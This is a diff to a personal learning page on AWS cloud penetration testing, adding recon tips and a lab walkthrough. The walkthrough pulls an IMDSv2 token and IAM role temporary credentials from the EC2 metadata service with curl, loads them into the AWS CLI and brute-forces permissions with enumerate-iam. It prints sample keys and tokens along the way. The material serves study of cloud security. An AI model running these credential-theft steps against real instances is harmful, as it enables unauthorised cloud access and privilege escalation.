@@ -12,9 +12,10 @@ header:
 
 # Pentesting cloud environments
 
-It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, as well as any notes I take on theoretical material. This is more or less the process I take when learning a new topic, but this time I'll be making it public. I'll be focusing on the cloud provider AWS.
+It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, as well as any notes I take on theoretical material.
 
-I'll update this page continuously and share it when I'm satisfied with it so it can be useful to someone out there. At the moment this post is still in development and I have not gone through all of this material, I may add or remove stuff in the future and cannot vouch for their quality yet.
+This is more or less the usual process I take whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.
+
 
 ## The plan
 
@@ -106,13 +107,119 @@ Start by **identifying the attack surface**, determining which services are:
 * Externally exposed
 * Managed by AWS or by the customer
 
-Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like with a web or infra penetration test
-
-
-
-
+Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like with a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information
 
 <br>
+
+A few **AWS-specific reconnaissance techniques**:
+* Searching the AWS Marketplace for the target organization as teh accountid may be disclosed
+* Brute-forcing the account ID via the AWS Sign-In URL: **`https://<accountid>.signin.aws.amazon.com`**
+* Searching through public snapshots (i.e EBS snapshots) or AMI Images
+
+<br>
+
+Regarding the **local filesystem**, other tasks besides the typical, non-cloud checks, are:
+* Discovery of AWS Access Credentials in home directories and application files
+* Verifying access to the **AWS metadata enpoint** at **`https://169.254.169.254/`** or **`http://[fd00:ec2::254]`**
+
+<br>
+
+**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens.
+
+Credentials can be requested via the **AWS metadata service** (see above), which holds different kinds of information split into different categories. The most interesting ones are:
+* **iam/info**, containing informaiton about associated IAM roles
+* **iam/security-credentials/role-name**, containing temporary security credentials associated with the role
+
+If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
+```
+[www-data@manager ~]$ TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+
+[www-data@manager ~]$ echo $TOKEN
+AQAAAPjZig94ZtF4xhBwgAATxNGTMMY5Xx6Bu2Hs2Fqp-St5WebEqQ==
+
+[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
+{
+  "accountId" : "124253853813",
+  "architecture" : "x86_64",
+  "availabilityZone" : "eu-central-1a",
+  "billingProducts" : null,
+  "devpayProductCodes" : null,
+  "marketplaceProductCodes" : null,
+  "imageId" : "ami-0c0d3776ef525d5dd",
+  "instanceId" : "i-067fa056e678575c6",
+  "instanceType" : "t2.micro",
+  "kernelId" : null,
+  "pendingTime" : "2023-02-21T10:30:41Z",
+  "privateIp" : "172.31.17.24",
+  "ramdiskId" : null,
+  "region" : "eu-central-1",
+  "version" : "2017-09-30"
+}
+```
+
+The token can then be used for more juicy requests to the service
+```
+[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
+{
+  "Code" : "Success",
+  "LastUpdated" : "2023-02-21T10:30:44Z",
+  "InstanceProfileArn" : "arn:aws:iam::124253853813:instance-profile/ServerManager",
+  "InstanceProfileId" : "AIPAWA6NVTVY3D6FKNVMM"
+}
+
+[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ServerManager
+{
+  "Code" : "Success",
+  "LastUpdated" : "2023-02-21T10:30:16Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAWA6NVTVYRAJE4MWO",
+  "SecretAccessKey" : "DvwdhlDdP13AnTPSgkk5LpToQSQGehcA3JK94gAG",
+  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNlbnRyYWwtMSJHMEUCIG9N8Fiy/2ew8j5egLDkoeqF5V3wPwK4jGe4cLAktbaPAiEA7Lo0iVA66CG8aEqNowjAmf4WpaY7dlikuOSXUEfiZ5Uq3wQIvP//////////ARAAGgw0MTQzNTg4MDU4NzMiDBmFU+syY8xirSbpHSqzBKUBkhtt3XJnGJdkbjRY6lywCQnlw8ANYcelnRP00P3dlyIb+QRHhCX4HLuYT7tzytaCNSRHmoEhuPebzxnQOqGVZNT03fseOGdlodl2tA+eX6RIRRwbYoe1TL/CZDltqR84EM7QNsODtTtsXc6LWbnDQH5aY8IhSCGNMyLThcuWxXHz1xXsJpyoSQD5gu1jeRi5wcZceF2P5A+anCV2PGxYGcc8PY4e2ySfL43pWVWJ20et7+lWFUoQgmf6jyiBr6SYr8c76/E98bndzQBnNIoUVjNuUDAvj4x/orFY1onssKMIH8ZUawodh1Q6jw3FTQjSf4rba/aNA4a6vZAnrrUNOsprmoZjv3yx6yHF3g5crL5FX5jPkzSvsz3tOZ9sYUu3g3h3TUjrdlZhA6z2yo/AK7XD7CHa1xwc8FOagBBqRYfGyrL7TNPZXa2EyQkfhI++9EzL4Wpbih/zcVVnlKUfJl610O3X3hJHst6rj6TZAuMP05g8LHdqdIkACFDmcCARKNL7I6KFFPS0sgLqYsu3FkrN55ZXXW4EmvdrnBTmdPfSL9hh77BbLH0uWQU1KhvI5fTmDnUGU24sUF/WQYQQKZShJ0sH82ivEmVFkD7157926d5Hensomg2spNoIXYj+uFGp/iAA9ySEQhz/WGqTJH/GBrp13e0smOusYdU75hg2aax3SPO3m25V29p6WjEajmPpbNkrgHqXXDxqiwF8awNDRuXl0pyPsM00RaW3o/tvMNS60p8GOqkB4S+G+taayWybv6Am85Ae7pSqwfMknjwBZfOTvTbVCydV2RpcZyv1gjqJhOguZZAQzv6rADK2OeBN0bmnNPxY4Om36AQ8eGdpZbs2naGBdCioV5UyLE99Y6dpI9881UG+i9i2qs0EclJLUOgxCdJIlV8j4AgURs2SZeuxfo5ZanG3LubP9BJGGLbLwo5CPDTHA0usGEDYZD1l0A5Ln6mB0EjB2py+g0Omew==",
+  "Expiration" : "2023-02-21T17:05:44Z"
+}
+```
+
+To leverage the extracted secrets in the AWS CLI, fill in **~/.aws/credentials**
+
+```
+[default]
+aws_access_key_id = ASIAWA6NVTVY5CNUKIUO
+aws_secret_access_key = wSHLoJrGVnjfo+xxKwt1cblFpiZgWF20DMxXpTXn
+aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNlbnRyYWwtMSJIMEYCIQCnZUyvONtQlYo9E7wvsBQp5yozH/EiPnO4BoXXajyIiwIhAMsOP10IS+ItChhHgzvKMprEPJkKpWl5GKTH3hInYv6gKt8ECLr//////////wEQABoMNDE0MzU4ODA1ODczIgyan7zp7MCE5SEbGO4qswTx/skDLRfBDHMnkXE9rzH7YXvEjXchuasGVywChi9vFyoujll7wc3gmts+LRrgrTC+lV5p/uDC3iHloXiPuEgf6YDRB0OoX4J9jKooGxBAmbdhyvL6kivHlywONtLE8mcf3SrC3ZZqyJ/5KQX+NWNt8Vj1GC/HNssYuToHOLExmUsm5Pw3VgElvcgRaovgU3hwQGLBh7gXCFzp4rAW57jaOcARGQJQr/ONYzgSIZ9LNqMjSBZwREVmTJVhzrDbz7AoPdERnz+K374jd/s+3k7ujBgYxOlk/0Osl7J2+79Wj5+7TDfQXulic/bEwJdCdFX1gcpN5CG3uXnQZQ1USwX4Zb6TSPvHutOOpDjX9pvG2qPt7QC5SV3EuDSOLNvPVrFExOKJcaQhryhZW56hHBpUyVkl5USV2KiAPaniJ6RjYewBX844ddYYaJGp9UEQSxovXPh0mwEKenVTegi3db1bMPkX0CT7IS4GO6bv71/++zQp+pl3fOvp9ixbAa3vzbawLQvpENHpDyRH9K6UT1VPFGK4tbgmrUmBytYp1SKc5UvEDJFg51htlk19MXO3F3fSUWPB5kuo6AEpxnzqElWagBVwswgt6hh0spVjm7PAoO7xTm9yfEc60li/RYGnT4PRQmlbiXiB/sdHVcM29Fmkg7aKo013z06OYNuzIF+Bldf2ziuL8rFM1aU0Af77lUNgpAto0A38iY3a1vBr9xpUJ6ZaXVxMXCbIKG8vTZ94P4f8+TD2idKfBjqoAT5RSXeKY76pZ+P1vOIE+btQjCYsqFzhQwDsk06w+9G89Pa5dVMvhOI0NT0foZeX7aJFhcHigrC5pPkooNQ0wBm1waotdwDTPEKAOwL8HHvtUiuohdR6kYNxKwzqt6g61HcNVd2qzoxf31uDMquXq3OdvcPZHR4LyitKGcptgjQ21ZzcIiuqsqg4k879O8D8v4U3GBSQk7B5UK/2pVKPmqLs/X4cTxUkmQ==
+```
+<br>
+
+Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then if the user has permissions to run **iam:list-attached-role-policies**
+
+```
+[www-data@manager ~]$ aws sts get-caller-identity
+{
+    "Account": "124253853813", 
+    "UserId": "AROAWA6NVTVY4Q3ND6536:i-067fa056e678575c6", 
+    "Arn": "arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6"
+}
+
+[www-data@manager ~]$ aws iam list-attached-role-policies --role-name ServerManager
+An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role ServerManager because no identity-based policy allows the iam:ListAttachedRolePolicies action
+```
+
+Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔).
+
+```
+[www-data@manager enumerate-iam-master]#./enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --session-token SESSION_TOKEN
+2023-02-23 14:10:27,443 - 3545 - [INFO] Starting permission enumeration for access-key-id "ASIAWA6NVTVYRAJE4MWO"
+2023-02-23 14:10:28,083 - 3545 - [INFO] -- Account ARN : arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6
+2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Id  : 124253853813
+2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Path: assumed-role/ServerManager/i-067fa056e678575c6
+2023-02-23 14:10:28,933 - 3545 - [INFO] Attempting common-service describe / list brute force.
+2023-02-23 14:10:35,937 - 3545 - [INFO] -- dynamodb.describe_endpoints() worked!
+2023-02-23 14:10:36,799 - 3545 - [INFO] -- sts.get_caller_identity() worked!
+2023-02-23 14:10:43,106 - 3545 - [INFO] -- ec2.describe_volumes() worked!
+```
+
+<br>
+
+Time to **escalate privileges**. 
 
 # CTFs and Hands-on material
 ## flaws.cloud
